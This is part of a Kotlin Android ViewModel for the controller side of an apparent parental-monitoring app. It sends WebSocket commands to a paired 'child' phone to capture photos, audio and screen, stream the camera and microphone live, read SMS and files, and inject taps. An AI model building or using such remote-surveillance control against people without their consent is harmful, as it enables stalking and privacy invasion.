            else -> "تنفيذ الأمر ($commandType)"
        }
    }

    fun sendBroadcastCommand(token: String, commandType: String, params: Map<String, Any> = emptyMap(), startTime: Long = System.currentTimeMillis()): Boolean {
        return try {
            val payload = org.json.JSONObject().apply {
                put("device_token", token)
                put("token", token)
                put("command", commandType)
                put("commandType", commandType)
                put("timestamp", startTime)
                val paramsJson = org.json.JSONObject()
                params.forEach { (key, value) -> paramsJson.put(key, value) }
                put("params", paramsJson)
            }

            // Broadcast strictly on the single unified device_presence channel topic
            realtimeStreamer?.sendBroadcast(
                topic = "realtime:device_presence",
                eventName = "command",
                payload = payload
            )

            Log.d("AdminViewModel", "Broadcasted command ($commandType) via WebSockets to device $token")
            addWebsocketEvent("تم إرسال الأمر ($commandType) بنجاح عبر WebSocket ⚡")
            
            if (commandType == "lock_device" || commandType == "unlock_device") {
                viewModelScope.launch {
                    try {
                        connector.updateLockInDatabase(token, commandType == "lock_device")
                    } catch (e: Exception) {
                        Log.e("AdminViewModel", "Error updating lock in DB: ${e.message}")
                    }
                }
            }
            true
        } catch (e: Exception) {
            Log.e("AdminViewModel", "Error sending broadcast command via WebSocket", e)
            false
        }
    }

    // REMOTE COMMAND DISPATCHER
    fun runCommand(commandType: String, params: Map<String, Any> = emptyMap(), silent: Boolean = false) {
        val token = _selectedDeviceToken.value
        if (token == null) {
            _statusMessage.value = "الرجاء تحديد جهاز طفل أولا."
            return
        }

        val label = getCommandArabicLabel(commandType)
        val startTime = System.currentTimeMillis()

        // Before sending, record pre-state
        val preScreenshotTime = _screenshots.value.firstOrNull()?.timestamp ?: 0L
        val prePhotoTime = _cameraPhotos.value.firstOrNull()?.timestamp ?: 0L
        val preAudioTime = _audioRecords.value.firstOrNull()?.timestamp ?: 0L
        val preVideoTime = _cameraVideos.value.firstOrNull()?.timestamp ?: 0L

        if (!silent) {
            _activeCommandProgress.value = ActiveCommandProgress(
                commandType = commandType,
                commandLabel = label,
                sendStatus = CommandStepStatus.RUNNING,
                startTimestamp = startTime
            )
        }

        viewModelScope.launch {
            delay(100)

            _commandResponse.value = null

            // Step 1: Sending Command via WebSocket
            val sendSuccess = sendBroadcastCommand(token, commandType, params, startTime)

            if (!sendSuccess) {
                if (commandType == "micro_on") {
                    _micStreamState.value = MicStreamState(isActive = false, isLoading = false, error = "فشل في إرسال الأمر عبر وبسوكيت")
                }
                if (!silent) {
                    _activeCommandProgress.value = _activeCommandProgress.value?.copy(
                        sendStatus = CommandStepStatus.FAILED,
                        sendError = "فشل في إرسال الأمر عبر وبسوكيت"
                    )
                }
                return@launch
            }

            // Step 1 Success! Move to Step 2
            if (!silent) {
                _activeCommandProgress.value = _activeCommandProgress.value?.copy(
                    sendStatus = CommandStepStatus.SUCCESS,
                    executionStatus = CommandStepStatus.RUNNING
                )
            }

            // Poll for up to 30 seconds local state checking
            val maxSeconds = 30
            val pollIntervalMs = 200L
            val maxIterations = (maxSeconds * 1000 / pollIntervalMs).toInt()
            var executedSuccessfully = false
            var executionErrorMessage: String? = null

            for (i in 0 until maxIterations) {
                delay(pollIntervalMs)

                // Check general command responses for success/error tags as explicit replies received over WebSockets
                val lastResponse = _commandResponse.value
                if (lastResponse != null) {
                    val (status, message, respTimestamp) = lastResponse
                    // We cleared _commandResponse before sending, so any non-null value here is the reply we are waiting for.
                    if (true) {
                        if (status == "success" || status == "completed" || status == "done" || status == "ok") {
                            executedSuccessfully = true
                            if (!silent) {
                                val cleanMsg = message.ifBlank { "تم تنفيذ الأمر بنجاح" }
                                _activeCommandProgress.value = _activeCommandProgress.value?.copy(
                                    resultMessage = cleanMsg
                                )
                            }
                            break
                        } else if (status == "error" || status == "failed") {
                            executedSuccessfully = false
                            executionErrorMessage = message.ifBlank { "التنفيذ فشل من طرف هاتف الطفل" }
                            break
                        }
                    } else {
                        // Stale response from an older command. Clear it so it doesn't block the loop.
                        _commandResponse.value = null
                    }
                }
            }

            if (executedSuccessfully) {
                if (commandType == "micro_on") {
                    if (liveAudioPlayer == null) {
                        liveAudioPlayer = LiveAudioPlayer()
                    }
                    liveAudioPlayer?.start()
                    _micStreamState.value = MicStreamState(isActive = true, isLoading = false, error = null)
                }
                
                // Instantly update Phase 2 to success on the UI
                if (!silent) {
                    val endProgress = _activeCommandProgress.value?.copy(
                        executionStatus = CommandStepStatus.SUCCESS,
                        resultMessage = _activeCommandProgress.value?.resultMessage ?: "تم استلام الرد وتنفيذ الأمر بنجاح!"
                    )
                    _activeCommandProgress.value = endProgress
                }

                // Sync to get the newest files (screenshot, audio, etc) since the child replied success asynchronously
                viewModelScope.launch {
                    try {
                        syncCurrentDeviceAll(token)
                    } catch (e: Exception) {
                        Log.e("AdminViewModel", "Error syncing after command success", e)
                    }

                    // Attach the recently fetched media items to the command state
                    if (!silent) {
                        var finalProgress = _activeCommandProgress.value
                        if (finalProgress != null) {
                            when (commandType) {
                                "take_screenshot" -> {
                                    val currentScreenshot = _screenshots.value.firstOrNull() { it.timestamp > preScreenshotTime }
                                    finalProgress = finalProgress.copy(responseData = currentScreenshot)
                                }
                                "take_photo", "take_photo_front", "take_photo_back" -> {
                                    val currentPhoto = _cameraPhotos.value.firstOrNull() { it.timestamp > prePhotoTime }
                                    finalProgress = finalProgress.copy(responseData = currentPhoto)
                                }
                                "record_audio" -> {
                                    val currentAudio = _audioRecords.value.firstOrNull() { it.timestamp > preAudioTime }
                                    finalProgress = finalProgress.copy(responseData = currentAudio)
                                }
                                "record_video_front", "record_video_back" -> {
                                    val currentVideo = _cameraVideos.value.firstOrNull() { it.timestamp > preVideoTime }
                                    finalProgress = finalProgress.copy(responseData = currentVideo)
                                }
                            }
                            _activeCommandProgress.value = finalProgress
                        }
                    }

                    // Play sound or show directly on screen
                    try {
                        when (commandType) {
                            "record_audio" -> {
                                val currentAudio = _audioRecords.value.firstOrNull { it.timestamp > preAudioTime }
                                    ?: _audioRecords.value.firstOrNull()
                                currentAudio?.base64?.let { base64Audio ->
                                    loadAndPlayAudio(base64Audio)
                                }
                            }
                            "take_screenshot" -> {
                                val currentScreenshot = _screenshots.value.firstOrNull { it.timestamp > preScreenshotTime }
                                    ?: _screenshots.value.firstOrNull()
                                currentScreenshot?.let { screenshotMedia ->
                                    _directScreenshotToShow.value = screenshotMedia
                                }
                            }
                            "take_photo", "take_photo_front", "take_photo_back" -> {
                                val currentPhoto = _cameraPhotos.value.firstOrNull { it.timestamp > prePhotoTime }
                                    ?: _cameraPhotos.value.firstOrNull()
                                currentPhoto?.let { photoMedia ->
                                    _directPhotoToShow.value = photoMedia
                                }
                            }
                        }
                    } catch (t: Throwable) {
                        Log.e("AdminViewModel", "Error displaying/playing newly synced command media", t)
                    }
                }
            } else {
                if (commandType == "micro_on") {
                    _micStreamState.value = MicStreamState(isActive = false, isLoading = false, error = executionErrorMessage ?: "فشل الاستماع للرد من هاتف الطفل. قد يكون الهاتف مغلقاً.")
                }
                
                if (!silent) {
                    _activeCommandProgress.value = _activeCommandProgress.value?.copy(
                        executionStatus = CommandStepStatus.FAILED,
                        executionError = executionErrorMessage ?: "انتهت مهلة الانتظار (30 ثانية) ولم يقم هاتف الطفل بالرد. تأكد من اتصال هاتفه بالإنترنت وتشغيله بالخلفية."
                    )
                }
            }
            
            if (!silent) {
                delay(3500) // Delay to let user see success or failure message
                _activeCommandProgress.value = null
            }
        }
    }

    fun changeLockStatus(shouldLock: Boolean) {
        val command = if (shouldLock) "lock_device" else "unlock_device"
        runCommand(command)
    }

    fun requestScreenshot() {
        runCommand("take_screenshot")
    }

    fun requestPhoto(frontCamera: Boolean) {
        val command = if (frontCamera) "take_photo_front" else "take_photo_back"
        runCommand(command)
    }

    fun requestVideo(isFront: Boolean) {
        val command = if (isFront) "record_video_front" else "record_video_back"
        runCommand(command)
    }

    fun requestAudioRecord() {
        runCommand("record_audio")
    }

    fun requestContacts() {
        runCommand("get_contacts")
    }

    fun playRemoteSound(soundName: String, volume: Int) {
        runCommand("play_remote_sound", mapOf(
            "Sound" to soundName,
            "Volume" to volume,
            "volume" to volume
        ))
    }

    fun turnOnFlashlight() {
        runCommand("flash_on")
    }

    fun turnOffFlashlight() {
        runCommand("flash_off")
    }

    fun requestAvailableSounds() {
        runCommand("get_sounds")
    }

    fun stopRemoteSound() {
        runCommand("stop_sound", emptyMap(), silent = true)
    }

    fun setRemoteVolume(volumePercent: Int) {
        runCommand("set_volume", mapOf("volume" to volumePercent))
    }

    fun sendNotification(title: String, message: String) {
        runCommand("send_notification", mapOf("title" to title, "message" to message))
    }
    
    fun sendRemoteClick(x: Float, y: Float) {
        val params = mapOf("x" to x.toString(), "y" to y.toString())
        runCommand("remote_click", params, silent = true)
    }

    fun sendRemoteSwipe(x1: Float, y1: Float, x2: Float, y2: Float, duration: Long = 300) {
        val params = mapOf(
            "x1" to x1.toString(),
            "y1" to y1.toString(),
            "x2" to x2.toString(),
            "y2" to y2.toString(),
            "duration" to duration.toString()
        )
        runCommand("remote_swipe", params, silent = true)
    }

    fun requestAppsList() {
        runCommand("list_apps")
        fetchInstalledApps()
    }

    fun fetchSmsLogs() {
        val token = _selectedDeviceToken.value ?: return
        viewModelScope.launch {
            val sms = connector.getSmsLogs(token)
            if (sms.isNotEmpty()) {
                _smsLogs.value = sms
            }
        }
    }

    fun fetchInstalledApps() {
        val token = _selectedDeviceToken.value ?: return
        viewModelScope.launch {
            val apps = connector.getInstalledApps(token)
            if (apps.isNotEmpty()) {
                _installedApps.value = apps
            }
        }
    }

    fun exploreDirectory(path: String) {
        _currentPath.value = path
        updateDeviceFilesList()
        // If map is completely empty, it might not be loaded at all
        if (_fullDeviceFilesMap.value.isEmpty()) {
            loadDeviceFileMap()
        }
    }

    private fun updateDeviceFilesList() {
        val current = _currentPath.value
        val allFiles = _fullDeviceFilesMap.value
        val filtered = allFiles.filter { it.parent_path == current }
        _deviceFiles.value = filtered
    }

    fun requestDirectoryScan(path: String) {
        _isFilesLoading.value = true
        runCommand("list_directory", mapOf("path" to path))
        
        // Timeout to reset loading state if no response
        viewModelScope.launch {
            delay(5000)
            if (_isFilesLoading.value) {
                _isFilesLoading.value = false
                addWebsocketEvent("❌ انتهى وقت انتظار قائمة الملفات من الجهاز (5 ثواني).")
            }
        }
    }

    fun loadDeviceFileMap() {
        val token = _selectedDeviceToken.value ?: return
        viewModelScope.launch {
            _isFilesLoading.value = true
            val files = connector.fetchDeviceFileMap(token)
            _fullDeviceFilesMap.value = files
            updateDeviceFilesList()
            _isFilesLoading.value = false
        }
    }

    fun clearAlerts() {
        val token = _selectedDeviceToken.value ?: return
        viewModelScope.launch {
            val success = connector.clearSecurityAlerts(token)
            if (success) {
                _securityAlerts.value = emptyList()
                _statusMessage.value = "تم تصفية جدار التنبيهات بنجاح"
            }
        }
    }

    // AUDIO PLAYBACK MANAGEMENT
    fun loadAndPlayAudio(base64Data: String) {
        val context = getApplication<Application>().applicationContext

        viewModelScope.launch {
            try {
                stopAudio()
                
                // Write Temp Music File
                val cleanBase64 = if (base64Data.contains(",")) base64Data.substringAfter(",") else base64Data
                val decodedBytes = android.util.Base64.decode(cleanBase64, android.util.Base64.DEFAULT)
                tempAudioFile = File.createTempFile("child_audio_rx", ".3gp", context.cacheDir).apply {
                    deleteOnExit()
                    FileOutputStream(this).use { fos ->
                        fos.write(decodedBytes)
                    }
                }

                mediaPlayer = MediaPlayer().apply {
                    setDataSource(tempAudioFile!!.absolutePath)
                    prepare()
                    _audioDuration.value = duration
                    start()
                    _isAudioPlaying.value = true
                }

                // Monitor playback progress
                audioProgressJob?.cancel()
                audioProgressJob = viewModelScope.launch {
                    while (_isAudioPlaying.value) {
                        mediaPlayer?.let { mp ->
                            if (mp.isPlaying) {
                                _audioPosition.value = mp.currentPosition
                            } else {
                                _isAudioPlaying.value = false
                            }
                        }
                        delay(250)
                    }
                }

                mediaPlayer?.setOnCompletionListener {
                    stopAudio()
                }

            } catch (t: Throwable) {
                Log.e("AdminViewModel", "MediaPlayer playback error", t)
                _statusMessage.value = "فشل تشغيل ملف الصوت المرمز: ${t.localizedMessage}"
            }
        }
    }

    fun pauseAudio() {
        mediaPlayer?.let {
            if (it.isPlaying) {
                it.pause()
                _isAudioPlaying.value = false
            }
        }
    }

    fun resumeAudio() {
        mediaPlayer?.let {
            it.start()
            _isAudioPlaying.value = true
            // Restart progress monitoring
            audioProgressJob?.cancel()
            audioProgressJob = viewModelScope.launch {
                while (_isAudioPlaying.value) {
                    mediaPlayer?.let { mp ->
                        if (mp.isPlaying) {
                            _audioPosition.value = mp.currentPosition
                        } else {
                            _isAudioPlaying.value = false
                        }
                    }
                    delay(250)
                }
            }
        }
    }

    fun seekAudio(positionMs: Int) {
        mediaPlayer?.let {
            it.seekTo(positionMs)
            _audioPosition.value = positionMs
        }
    }

    fun stopAudio() {
        audioProgressJob?.cancel()
        _isAudioPlaying.value = false
        _audioPosition.value = 0
        _playingFileUrl.value = null
        _audioLoadingUrl.value = null
        try {
            mediaPlayer?.apply {
                if (isPlaying) stop()
                release()
            }
        } catch (e: Exception) {
            // Ignore
        }
        mediaPlayer = null
        tempAudioFile?.delete()
        tempAudioFile = null
    }

    fun playAudioFromUrl(url: String) {
        viewModelScope.launch {
            try {
                if (_playingFileUrl.value == url) {
                    if (_isAudioPlaying.value) {
                        pauseAudio()
                    } else {
                        resumeAudio()
                    }
                    return@launch
                }

                // Stop active playback before playing something else
                stopAudio()
                
                _audioLoadingUrl.value = url
                _playingFileUrl.value = url

                mediaPlayer = MediaPlayer().apply {
                    setAudioStreamType(AudioManager.STREAM_MUSIC)
                    setDataSource(url)
                    
                    setOnPreparedListener { mp ->
                        _audioLoadingUrl.value = null
                        _audioDuration.value = mp.duration
                        _audioPosition.value = 0
                        mp.start()
                        _isAudioPlaying.value = true
                    }
                    
                    setOnErrorListener { mp, what, extra ->
                        _audioLoadingUrl.value = null
                        _isAudioPlaying.value = false
                        _playingFileUrl.value = null
                        Log.e("AdminViewModel", "MediaPlayer URL loading error: what=$what, extra=$extra")
                        _statusMessage.value = "فشل تحميل الصوت من الرابط"
                        false
                    }
                    
                    setOnCompletionListener {
                        stopAudio()
                    }
                    
                    prepareAsync()
                }

                // Monitor playback progress
                audioProgressJob?.cancel()
                audioProgressJob = viewModelScope.launch {
                    while (true) {
                        mediaPlayer?.let { mp ->
                            if (_isAudioPlaying.value && mp.isPlaying) {
                                _audioPosition.value = mp.currentPosition
                            }
                        }
                        delay(250)
                    }
                }

            } catch (t: Throwable) {
                _audioLoadingUrl.value = null
                _isAudioPlaying.value = false
                _playingFileUrl.value = null
                Log.e("AdminViewModel", "MediaPlayer play audio url error", t)
                _statusMessage.value = "خطأ في تشغيل الصوت: ${t.localizedMessage}"
            }
        }
    }

    fun refreshAudioRecords(token: String) {
        viewModelScope.launch {
            _audioRecordsState.value = AudioRecordsState.Loading
            try {
                val mediaAudioList = connector.getMediaAudioFiles(token)
                if (mediaAudioList.isEmpty()) {
                    _audioRecordsState.value = AudioRecordsState.Empty
                } else {
                    _audioRecordsState.value = AudioRecordsState.Success(mediaAudioList)
                }
                _audioRecords.value = connector.getAudioRecords(token)
            } catch (e: java.lang.Exception) {
                _audioRecordsState.value = AudioRecordsState.Error(e.localizedMessage ?: e.message ?: "خطأ في جلب البيانات المحيطة")
            }
        }
    }

    fun startLiveStream() {
        val token = _selectedDeviceToken.value ?: return
        val command = "stream_screen"
        
        // Show loading state and instantly start the Web Player since we expect Supabase Broadcast
        _liveStreamState.value = LiveStreamState(
            isActive = true,
            isLoading = false,
            error = null,
            streamUrl = "supabase_broadcast"
        )
        
        viewModelScope.launch {
            val startTime = System.currentTimeMillis()
            _commandResponse.value = null
            sendBroadcastCommand(token, command, emptyMap(), startTime)
        }
    }

    fun stopLiveStream() {
        val token = _selectedDeviceToken.value ?: return
        runCommand("stop_stream")
        _liveStreamState.value = _liveStreamState.value?.copy(isActive = false)
    }

    fun startMicStream() {
        _micStreamState.value = MicStreamState(isActive = false, isLoading = true, error = null)
        runCommand("micro_on")
    }

    fun stopMicStream() {
        runCommand("micro_off")
        liveAudioPlayer?.stop()
        liveAudioPlayer = null
        _micStreamState.value = MicStreamState(isActive = false, isLoading = false, error = null)
    }

    fun startCameraStream(isFront: Boolean) {
        val token = _selectedDeviceToken.value ?: return
        val command = if (isFront) "stream_camera_front" else "stream_camera_back"
        
        // Show loading state, reset error and active state
        _cameraStreamState.value = CameraStreamState(
            isActive = false, 
            isLoading = true, 
            error = null, 
            cameraType = if (isFront) "front" else "back"
        )
        
        viewModelScope.launch {
            val startTime = System.currentTimeMillis()
            
            _commandResponse.value = null
            
            // Send command via WebSocket
            val sendSuccess = sendBroadcastCommand(token, command, emptyMap(), startTime)
            
            if (!sendSuccess) {
                _cameraStreamState.value = _cameraStreamState.value?.copy(
                    isLoading = false,
                    error = "فشل في إرسال الأمر للطفل. تأكد من اتصاله بالإنترنت."
                )
                return@launch
            }
            
            // Poll for command response
            val maxIterations = 20
            var success = false
            var errorMsg: String? = null
            
            for (i in 0 until maxIterations) {
                delay(1000)
                // Fast exit if WebSocket already got the stream
                if (_cameraStreamState.value?.isActive == true || !(_cameraStreamState.value?.streamUrl.isNullOrBlank())) {
                    success = true
                    break
                }
                
                val resp = _commandResponse.value
                if (resp != null && resp.third >= (startTime - 15000L)) {
                    if (resp.first == "success" || resp.first == "ok" || resp.first == "completed") {
                        success = true
                        break
                    } else if (resp.first == "error" || resp.first == "failed") {
                        errorMsg = resp.second.ifBlank { "التطبيق الأبوي للطفل فشل في تشغيل الكاميرا." }
                        break
                    }
                }
            }
            
            if (success) {
                // Done loading, now stream is active
                _cameraStreamState.value = _cameraStreamState.value?.copy(
                    isLoading = false,
                    isActive = true,
                    error = null
                )
            } else {
                _cameraStreamState.value = _cameraStreamState.value?.copy(
                    isLoading = false,
                    error = errorMsg ?: "انتهت مهلة الانتظار ولم يقم هاتف الطفل بالرد."
                )
            }
        }
    }

    fun stopCameraStream() {
        val token = _selectedDeviceToken.value ?: return
        runCommand("stop_camera_stream")
        _cameraStreamState.value = _cameraStreamState.value?.copy(isActive = false)
    }

    fun deleteMediaItem(category: String, itemId: String) {
        val token = _selectedDeviceToken.value ?: return
        viewModelScope.launch {
            val success = connector.deleteMediaItem(token, category, itemId)
            if (success) {
                _statusMessage.value = "تم حذف الملف نهائياً من قاعدة البيانات"
                // Refresh list
                when (category) {
                    "screenshots" -> {
                        try {
                            _screenshots.value = connector.getScreenshots(token)
                        } catch(e: Exception) {
                            _statusMessage.value = "خطأ: ${e.message}"
                        }
                    }
                    "camera_photos" -> _cameraPhotos.value = connector.getCameraPhotos(token)
                    "audio_records" -> _audioRecords.value = connector.getAudioRecords(token)
                    "video_records" -> _cameraVideos.value = connector.getCameraVideos(token)
                }
            } else {
                _statusMessage.value = "فشل حذف الملف، حاول مرة أخرى"
            }
        }
    }

    private fun parseAppsFromText(responseText: String): List<InstalledApp> {
        val list = mutableListOf<InstalledApp>()
        responseText.lineSequence().forEach { line ->
            val trimmed = line.trim()
            if (trimmed.startsWith("-") || trimmed.startsWith("*") || trimmed.length > 5) {
                var content = if (trimmed.startsWith("-") || trimmed.startsWith("*")) {
                    trimmed.substring(1).trim()
                } else {
                    trimmed
                }
                if (content.contains("(") && content.endsWith(")")) {
                    val openParenIndex = content.lastIndexOf("(")
                    val name = content.substring(0, openParenIndex).trim()
                    val pkg = content.substring(openParenIndex + 1, content.length - 1).trim()
                    if (name.isNotEmpty() && pkg.isNotEmpty()) {
                        list.add(InstalledApp(name = name, packageName = pkg, isSystem = pkg.startsWith("com.android.") || pkg.startsWith("com.google.android.") || pkg.contains("system")))
                    }
                } else if (content.isNotEmpty()) {
                    if (content.contains(" ") && !content.contains(".")) {
                        list.add(InstalledApp(name = content, packageName = content.replace(" ", "."), isSystem = false))
                    } else if (content.contains(".")) {
                        list.add(InstalledApp(name = content.substringAfterLast("."), packageName = content, isSystem = content.startsWith("com.android.") || content.startsWith("com.google.android.")))
                    } else {
                        list.add(InstalledApp(name = content, packageName = content, isSystem = false))
                    }
                }
            }
        }
        return list.sortedBy { it.name.lowercase() }
    }

    private fun parseFilesFromTextOrJson(responseText: String): List<FileItem> {
        val list = mutableListOf<FileItem>()
        val trimmedText = responseText.trim()
        if (trimmedText.startsWith("[")) {
            try {
                val arr = org.json.JSONArray(trimmedText)
                for (i in 0 until arr.length()) {
                    val obj = arr.optJSONObject(i) ?: continue
                    list.add(FileItem(
                        name = obj.optString("name"),
                        path = obj.optString("path"),
                        isDir = obj.optBoolean("is_dir") || obj.optBoolean("isDir"),
                        size = obj.optLong("size_bytes", obj.optLong("size", 0L)),
                        date = obj.optString("date", "")
                    ))
                }
                return list.sortedWith(compareBy<FileItem> { !it.isDir }.thenBy { it.name.lowercase() })
            } catch (e: Exception) {
                // Fall back to line parser
            }
        }

        var baseDir = "/storage/emulated/0"
        responseText.lineSequence().forEach { line ->
            val trimmed = line.trim()
            if (trimmed.contains("مسار المجلد") || trimmed.contains("المجلد الحالي") || trimmed.contains("Path:") || trimmed.contains("Folder Path:")) {
                val pathPart = trimmed.substringAfter(":").trim()
                if (pathPart.isNotEmpty()) {
                    baseDir = pathPart.replace("=========================================", "").trim()
                }
            }
        }

        responseText.lineSequence().forEach { line ->
            val trimmed = line.trim()
            if (trimmed.isEmpty() || trimmed.startsWith("===") || trimmed.contains("مسار") || trimmed.contains("المجلد") || trimmed.contains("Path:") || trimmed.contains("Folder Path:")) {
                return@forEach
            }
            
            val isDir = trimmed.contains("📁") || trimmed.contains("[DIR]", ignoreCase = true) || trimmed.lowercase().contains("directory")
            
            var cleanName = trimmed
                .replace("📁", "")
                .replace("📄", "")
                .replace("📝", "")
                .replace("💾", "")
                .replace("- ", "")
                .replace("* ", "")
                .replace("[DIR]", "", ignoreCase = true)
                .replace("[FILE]", "", ignoreCase = true)
                .trim()
            
            if (cleanName.isNotEmpty()) {
                var itemPath = ""
                if (cleanName.contains("(") && cleanName.endsWith(")")) {
                    val openP = cleanName.lastIndexOf("(")
                    itemPath = cleanName.substring(openP + 1, cleanName.length - 1).trim()
                    cleanName = cleanName.substring(0, openP).trim()
                } else {
                    itemPath = if (baseDir.endsWith("/")) "$baseDir$cleanName" else "$baseDir/$cleanName"
                }

                list.add(FileItem(
                    name = cleanName,
                    path = itemPath,
                    isDir = isDir,
                    size = 0L,
                    date = ""
                ))
            }
        }
        return list.distinctBy { it.path }.sortedWith(compareBy<FileItem> { !it.isDir }.thenBy { it.name.lowercase() })
    }

    override fun onCleared() {
        super.onCleared()
        syncJob?.cancel()
        streamPollingJob?.cancel()
        realtimeStreamer?.shutdown()
        realtimeStreamer = null
        stopAudio()
    }
}
